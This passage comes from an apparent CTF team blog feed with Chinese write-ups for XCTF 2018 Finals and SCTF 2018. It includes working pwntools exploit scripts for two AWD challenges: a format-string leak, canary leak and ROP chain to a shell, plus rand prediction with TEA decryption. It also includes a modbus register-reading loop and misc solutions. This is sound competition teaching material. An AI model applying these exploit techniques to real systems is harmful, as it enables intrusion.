should recover all the data according to the remaining signals(hex).</p><p>在github上搜索FXTH871x7，找到这个：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Misc/crc_00.png"></p><p>猜测校验位置是crc</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Misc/crc_01.png"></p><p>计算出crc16</p><p>拼接到数据后面得到flag &gt;flag:20959185b1115208133f</p><h1><span id="awd">AWD</span></h1><h2><span id="pubg">pubg</span></h2><p>漏洞其实挺明显的，首先gou那个函数 有一个格式化字符串漏洞，可以leak一些地址，利用%x%x%x%lx能leak到一个ld.so附近的地址</p><p>在gou函数那里，它还会让你猜3个byte的随机数，如果强行爆破的话是不行的，因为概率是1/(256*256*256)</p><p>但是格式化字符串漏洞%x%x，第二个leak出来的东西是猜中的数量，所以利用这个就可以爆破出来，爆破最多256*3次就行了</p><p>爆破完之后到gang那个函数有一个任意读，利用上面leak的ld.so附近的地址，可以leak出canary，因为canary会在那附近存一下</p><p>任意读完之后，有一个栈溢出，利用栈溢出就可以进行rop来get shell</p><p>这里还有一个坑点就是，本地ld.so和libc.so的偏移和服务器的不同，后面强行爆破了一波</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pubg'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'192.168.20.11'</span>,<span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(x,s)</span>:</span></span><br><span class="line">    ru(<span class="string">'&amp;gt; '</span>)</span><br><span class="line">    sl(str(x))</span><br><span class="line">    ru(<span class="string">'which one is your favorite?'</span>)</span><br><span class="line">    sl(str(s))</span><br><span class="line">    ru(<span class="string">'&amp;gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gou</span><span class="params">(x,con=False)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Maybe you can get an airdrop. Tell me your position:&amp;#92;n'</span>)</span><br><span class="line">    sl(x)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> con:</span><br><span class="line">        data=ru(<span class="string">' has'</span>)[:<span class="number">-4</span>]</span><br><span class="line">        ru(<span class="string">'&amp;gt; '</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ru(<span class="string">'&amp;gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gang</span><span class="params">(x)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Winner winner,chicken dinner. The whole memory is yours, now pick one chicken:'</span>)</span><br><span class="line">    sl(str(x))</span><br><span class="line">    ru(<span class="string">'The '</span>)</span><br><span class="line">    cookie=ru(<span class="string">' ch'</span>)[:<span class="number">-3</span>]</span><br><span class="line">    cookie=cookie[:<span class="number">15</span>]</span><br><span class="line">    </span><br><span class="line">    payload=cyclic(<span class="number">40</span>)+<span class="string">'&amp;#92;x00'</span>+cookie+p64(base+<span class="number">0x4526a</span>)+<span class="string">'&amp;#92;x00'</span>*<span class="number">0x100</span></span><br><span class="line">    sl(payload)    </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    secert=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> chr(q)==<span class="string">'$'</span> <span class="keyword">or</span> chr(q)==<span class="string">'*'</span> <span class="keyword">or</span> chr(q)==<span class="string">'n'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> gou(secert+chr(q)+<span class="string">'%x%x'</span>)[i+<span class="number">3</span>]==str(i+<span class="number">1</span>):</span><br><span class="line">                secert+=chr(q)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> secert</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">choose(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">libc=int(gou(<span class="string">'%x%x%x%lx'</span>)[<span class="number">5</span>:],<span class="number">16</span>)</span><br><span class="line">tbase=libc<span class="number">-0x5D3700</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    base=tbase</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    base=libc<span class="number">-0x5D3700</span><span class="number">-0x4000</span><span class="number">-0x16000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secert=brute()+<span class="string">'&amp;#92;00'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gou(secert,<span class="keyword">True</span>)</span><br><span class="line">gang(tbase+<span class="number">0x5D3728</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'icken is on your plate, enjoy it~'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">flag=ru(<span class="string">'&amp;#92;n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="randbattle">randbattle</span></h2><p>这题相对简单点，所以就做了这题，不过这题出得有点恶心，能搅屎..........</p><p>首先题目有3个选项</p><ol type="1"><li>Double Dice Game</li><li>Triple Dice Game</li><li>Combination Game</li></ol><p>首先先来说下第一个功能</p><p><strong>Double Dice Game</strong></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_00.png"></p><p>它会rand三个数，然后让你去猜，假如说你没进第三个功能，那么一开始就是srand(0)的，因此这三个数是固定的</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_01.png"> 如果三个数都成功猜中，它会让你输入5byte，但实际是4byte的密码，然后读取flag，用输入的密码加密，加密的方法是tea加密</p><p>加密完之后，它会判断是否存在一个 /tmp/qualiii 这个文件，如果存在的话就会返回上一层</p><p>不存在的话，它会创建并将flag写入到其中，然后sleep，sleep完之后，如果文件还存在的话，就会打印加密后的flag</p><p><strong>Triple Dice Game</strong></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_02.png"></p><p>这里分为3个部分</p><p>第一个函数会首先srand(time(0)) 然后再rand了三个字母，第二个函数打印这三个字母，然后第三个函数是读取的，读取然后之后判断输入是否正确</p><p>如果正确的话，会进到最后一个函数</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_03.png"></p><p>这里还是让你猜3个数，猜中之后</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_04.png"> 能删除 /tmp/qualiii这个文件</p><p><strong>Combination Game</strong></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/AWD/randbattle_05.png"></p><p>前面是猜字母加猜数字</p><p>猜中之后，能打印出/tmp/qualiii的内容</p><p>下面是一个简单的payload，没人竞争的时候能读出flag，至于怎么心机的利用这几个功能去搅屎和反搅屎，这里就不多说了.......（策略太多了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">LIBC = ctypes.cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./randbattle'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'192.168.20.13'</span>,<span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(v, k)</span>:</span></span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    z = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    sum = c_uint32(<span class="number">0xc6ef3720</span>)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    n = <span class="number">32</span></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(n&amp;gt;<span class="number">0</span>):</span><br><span class="line">        z.value -= ( y.value &amp;lt;&amp;lt; <span class="number">4</span> ) + k[<span class="number">2</span>] ^ y.value + sum.value ^ ( y.value &amp;gt;&amp;gt; <span class="number">5</span> ) + k[<span class="number">3</span>]</span><br><span class="line">        y.value -= ( z.value &amp;lt;&amp;lt; <span class="number">4</span> ) + k[<span class="number">0</span>] ^ z.value + sum.value ^ ( z.value &amp;gt;&amp;gt; <span class="number">5</span> ) + k[<span class="number">1</span>]</span><br><span class="line">        sum.value -= delta</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    w[<span class="number">0</span>] = y.value</span><br><span class="line">    w[<span class="number">1</span>] = z.value</span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdice</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'case2'</span>)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        LIBC.srand(LIBC.time(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LIBC.srand(LIBC.time(<span class="number">0</span>)<span class="number">-20</span>)    </span><br><span class="line">    s=[LIBC.rand()%<span class="number">26</span>+<span class="number">65</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        w+=chr(i)</span><br><span class="line">    w+=<span class="string">'&amp;#92;x00'</span></span><br><span class="line">    se(w)</span><br><span class="line">    ru(<span class="string">'num:'</span>)</span><br><span class="line">    sl(str(LIBC.rand()%<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">'num:'</span>)</span><br><span class="line">    sl(str(LIBC.rand()%<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">'num:'</span>)</span><br><span class="line">    sl(str(LIBC.rand()%<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">'Your choice:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ddice</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'num:'</span>)</span><br><span class="line">    sl(str(LIBC.rand()%<span class="number">6</span>))</span><br><span class="line">    ru(<span class="string">'num:'</span>)</span><br><span class="line">    sl(str(LIBC.rand()%<span class="number">6</span>))</span><br><span class="line">    ru(<span class="string">'Set your pass:'</span>)</span><br><span class="line">    se(<span class="string">'&amp;#92;x00'</span>*<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">'Here is your gift:&amp;#92;n'</span>)</span><br><span class="line">    flag=ru(<span class="string">'C U'</span>)[:<span class="number">-3</span>]</span><br><span class="line">    flag=flag.split(<span class="string">':'</span>)</span><br><span class="line">    flag=[chr(int(i,<span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">    w=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        w+=i</span><br><span class="line">    t=[]</span><br><span class="line">    key=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(w),<span class="number">4</span>):</span><br><span class="line">        t.append(u32(w[i:i+<span class="number">4</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(t),<span class="number">2</span>):</span><br><span class="line">        q=decipher(t[i:i+<span class="number">2</span>],key)</span><br><span class="line">        flag+=p32(q[<span class="number">0</span>])</span><br><span class="line">        flag+=p32(q[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">tdice()</span><br><span class="line">print(ddice())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="xctf" scheme="https://blog.de1ta.com/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>SCTF 2018 Writeup</title>
    <link href="https://blog.de1ta.com/2018/06/22/SCTF2018/"/>
    <id>https://blog.de1ta.com/2018/06/22/SCTF2018/</id>
    <published>2018-06-22T05:41:57.000Z</published>
    <updated>2020-05-07T04:29:45.965Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><!-- toc --><ul><li><a href="#0x00-misc">0x00 Misc</a><ul><li><a href="#神秘的交易">神秘的交易</a></li><li><a href="#神奇的modbus">神奇的modbus</a></li><li><a href="#肥宅快乐题">肥宅快乐题</a></li><li><a href="#被动了手脚的数据">被动了手脚的数据</a></li><li><a href="#侧信道初探">侧信道初探</a></li><li><a href="#交易识破后的报复">交易识破后的报复</a><ul><li><a href="#背景知识">背景知识</a><ul><li><a href="#0x00-概述">0x00 概述</a></li><li><a href="#0x01-4428协议介绍">0x01 4428协议介绍</a><ul><li><a href="#11-复位并应答复位">1.1 复位并应答复位</a></li><li><a href="#12-命令模式">1.2 命令模式</a></li></ul></li></ul></li><li><a href="#开始解题">开始解题</a><ul><li><a href="#密码校验">密码校验</a></li><li><a href="#写擦除数据">写/擦除数据</a></li></ul></li></ul></li></ul></li><li><a href="#0x01-crypto">0x01 Crypto</a><ul><li><a href="#it-may-contain-flag">it may contain 'flag'</a></li></ul></li><li><a href="#0x02-pwn">0x02 Pwn</a><ul><li><a href="#bufoverflow_a">bufoverflow_a</a></li><li><a href="#sbbs">sbbs</a></li><li><a href="#bufoverflow_b">bufoverflow_b</a></li><li><a href="#wtf_game">WTF_Game</a></li></ul></li><li><a href="#0x03-reverse">0x03 Reverse</a><ul><li><a href="#script-in-script">script in script</a></li><li><a href="#where-is-my-13th-count">Where is my 13th count？</a></li><li><a href="#babymips">Babymips</a></li><li><a href="#crackme2">crackme2</a></li><li><a href="#simple">simple</a></li></ul></li><li><a href="#0x04-web">0x04 Web</a><ul><li><a href="#zhuanxv">Zhuanxv</a></li><li><a href="#easiest-web-phpmyadmin">easiest web - phpmyadmin</a></li><li><a href="#babysyc-simple-php-web">BabySyc - Simple PHP Web</a><ul><li><a href="#预期解">预期解</a></li><li><a href="#非预期解">非预期解</a><ul><li><a href="#踩过的坑点">踩过的坑点</a></li></ul></li></ul></li><li><a href="#新的建议板">新的建议板</a></li></ul></li></ul><!-- tocstop --><h1><span id="0x00-misc">0x00 Misc</span></h1><h2><span id="神秘的交易">神秘的交易</span></h2><p>参考资料： https://bbs.pediy.com/thread-151259-1.htm https://www.waitalone.cn/security-hardware-usb.html 下载Saleae Logic 分析软件分析截获的logicdata数据包：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7aa31c78-75fc-1.png"></p><p>clk栏为时钟电平，data栏为数据电平。 每个指令都在时钟高电平时数据下降沿后开始，数据从低位到高位的顺序发送。发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据，然后时钟高电平数据电平上升沿代表本次命令结束。我们关注的指令类型为0x33，用于校验口令。发送命令格式为 <code>0x33 0x01 s1</code> <code>0x33 0x02 s2</code> <code>0x33 0x03 s3</code> 其中s1 s2 s3拼在一起就是那三个字节的口令了. 在下图方框部分可以找到校验口令：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7abb46ea-75fc-1.png"></p><p>放大后三条命令分别为：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171308-7ae3483e-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b008f8e-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b23c526-75fc-1.png"></p><p>在时钟电平为高电平时对应的数据电平高低位分别表示1和0，且数据按从低位到高位的顺序发送，因此三调指令分别为： 0x33 0x01 0x40 0x33 0x02 0x31 0x33 0x03 0x10 因此三个口令为 0x40 0x31 0x10 &gt; <code>flag：SCTF{403110}</code></p><h2><span id="神奇的modbus">神奇的modbus</span></h2><p>拿到数据包，输入modbus过滤</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b3f8784-75fc-1.png"></p><p>随便点一个，追踪tcp流，得到flag</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b54426e-75fc-1.png"> &gt; <code>flag:sctf{Easy_Mdbus}</code></p><h2><span id="肥宅快乐题">肥宅快乐题</span></h2><p>拿到swf文件，先扔到IE里玩了一下，没有什么特别的发现 游戏难度较高，通关遥遥无期 于是，直接用爱奇艺播放器打开，在第57帧可以看到通关的NPC对话</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171309-7b8071e0-75fc-1.png"></p><p>得到一串base64</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7b93f904-75fc-1.png"></p><blockquote><p><code>flag:SYC{F3iZhai_ku4ile_T111}</code></p></blockquote><h2><span id="被动了手脚的数据">被动了手脚的数据</span></h2><p>题目提示了数据，这里使用了一款工具modbus-cli（https://github.com/tallakt/modbus-cli ）接收modbus协议的数据。用法如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7ba99eda-75fc-1.png"></p><p>这里尝试读取1000字节的数据，由于每次读取数据长度太长会导致timeout，因此每次只读取50字节，写个脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">start=400001</span><br><span class="line">offset=50</span><br><span class="line"><span class="keyword">for</span> ((i=<span class="variable">$start</span>; i&lt;=400001+1000; i+=50))  </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">modbus <span class="built_in">read</span> --modicon 116.62.123.67 <span class="variable">$i</span> <span class="variable">$offset</span></span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>在跑出来的结果中，发现在400300-400331地址间有一段可疑数据：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bbd49da-75fc-1.png"></p><p>把数据提取出来，转hex转ascii：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">21810</span>, <span class="number">18035</span>, <span class="number">25671</span>, <span class="number">22123</span>, <span class="number">22577</span>, <span class="number">11092</span>, <span class="number">26979</span>, <span class="number">26482</span>, <span class="number">22117</span>, <span class="number">18758</span>, <span class="number">14640</span>, <span class="number">18761</span>, <span class="number">30789</span>, <span class="number">28503</span>, <span class="number">12912</span>, <span class="number">28789</span>, <span class="number">13161</span>, <span class="number">12151</span>, <span class="number">26946</span>, <span class="number">13638</span>, <span class="number">30073</span>, <span class="number">26177</span>, <span class="number">29764</span>, <span class="number">29293</span>, <span class="number">11064</span>, <span class="number">31308</span>, <span class="number">21879</span>, <span class="number">27205</span>, <span class="number">20314</span>, <span class="number">13876</span>, <span class="number">26178</span>, <span class="number">13162</span>] </span><br><span class="line"><span class="keyword">print</span> len(data) flag=<span class="string">""</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)): </span><br><span class="line">    flag+=hex(data[i])[<span class="number">2</span>:].decode(<span class="string">'hex'</span>) </span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#U2FsdGVkX1+TicgrVeIF90IIxEoW2ppu3i/wiB5FuyfAtDrm+8zLUwjEOZ64fB3j</span></span><br></pre></td></tr></table></figure><p>得到字符串U2FsdGVkX1+TicgrVeIF90IIxEoW2ppu3i/wiB5FuyfAtDrm+8zLUwjEOZ64fB3j，由U2Fsd特征易知是AES加密的密文，使用解密网站，密钥为空，解得flag：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bcdaf3c-75fc-1.png"></p><blockquote><p>flag：sctf{S_y3L_0v6:M_0_dbus}</p></blockquote><h2><span id="侧信道初探">侧信道初探</span></h2><p>从代码可以看出，当ki等于1时，需要多执行一步R←R+P，因此时间和功耗都会增加：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7bdb9f48-75fc-1.png"></p><p>因此1 0 对应关系如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7c0c01f6-75fc-1.png"></p><blockquote><p><code>flag:SCTF{0110111010}</code></p></blockquote><h2><span id="交易识破后的报复">交易识破后的报复</span></h2><p>这题是赛后才解出来的orz ### 背景知识 #### 0x00 概述</p><blockquote><p>根据IC卡中嵌入的集成电路的不同可以分为三类：存储器卡、逻辑加密卡、CPU卡。其中逻辑加密卡是功能介于存储器卡和CPU卡之间，逻辑加密卡主要是由EEPROM单元阵列和密码控制逻辑组成。根据统计资料分析，逻辑加密卡在应用中所占的比例是最高的。</p><p>SLE4428是SIMENS公司设计的逻辑加密IC卡, 容量为1K x 8Bit, 设有两个字节的密码. 只有通过了密码验证, 才可以对IC卡内的没有设置写/擦除保护的内容进行写/擦除. 内部有错误计数器(EC), 错误计数器总是可以被写的, 如果连续8次校验密码不成功, IC卡将自动被锁死, 数据只能读出, 不可再校验密码. 每个字节都可以单独的设置写/擦除保护, 一旦设置了写/擦除保护, 这个字节的数据就不能再写/擦除了, 而且写保护功能只能设置一次. 除了密码区, 其他所有字节在任何时候都可以读出来. (引自: <逻辑加密ic卡sle4428介绍及其应用>[张元良/杨加林])</逻辑加密ic卡sle4428介绍及其应用></p><p>下图是卡的引脚及对应的功能:</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171310-7c22a1c2-75fc-1.png"></p><p>内部结构图如下:</p><p><img 